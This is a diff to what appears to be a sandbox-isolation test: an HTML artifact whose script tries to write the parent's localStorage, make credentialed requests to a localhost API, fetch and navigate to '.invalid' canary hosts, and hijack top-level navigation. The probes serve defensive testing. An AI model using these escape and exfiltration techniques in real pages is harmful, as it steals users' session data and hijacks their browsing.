@@ -10,9 +10,10 @@ const authoredHtml = `<!doctype html><html><head><title>Isolated artifact</title
     try { parent.localStorage.setItem('renderer-canary', 'leaked'); probe.parentStorage = true; } catch {}
     fetch('https://connect-canary.invalid/leak').catch(() => {});
     probe.fetchAttempted = true;
-    fetch('http://127.0.0.1:43873/api/v1/renderer-canary', { credentials: 'include' }).catch(() => {});
+    const appCanary = 'http://127.0.0.1:43873/api/v1/renderer-canary?run=' + encodeURIComponent(window.name);
+    fetch(appCanary, { credentials: 'include' }).catch(() => {});
     const xhr = new XMLHttpRequest();
-    xhr.open('GET', 'http://127.0.0.1:43873/api/v1/renderer-canary');
+    xhr.open('GET', appCanary);
     xhr.withCredentials = true;
     try { xhr.send(); } catch {}
     probe.xhrAttempted = true;
@@ -22,7 +23,10 @@ const authoredHtml = `<!doctype html><html><head><title>Isolated artifact</title
     try { top.location = 'https://top-canary.invalid/leak'; probe.topNavigationAssigned = true; } catch {}
     parent.postMessage({ type: 'shelf:test-boundary', probe }, '*');
     addEventListener('load', () => {
-      setTimeout(() => { location.href = 'https://navigation-canary.invalid/leak'; }, 25);
+      setTimeout(() => {
+        parent.postMessage({ type: 'shelf:test-navigation-attempt' }, '*');
+        location.href = 'https://navigation-canary.invalid/leak';
+      }, 25);
     }, { once: true });
   </script>
 </body></html>`;
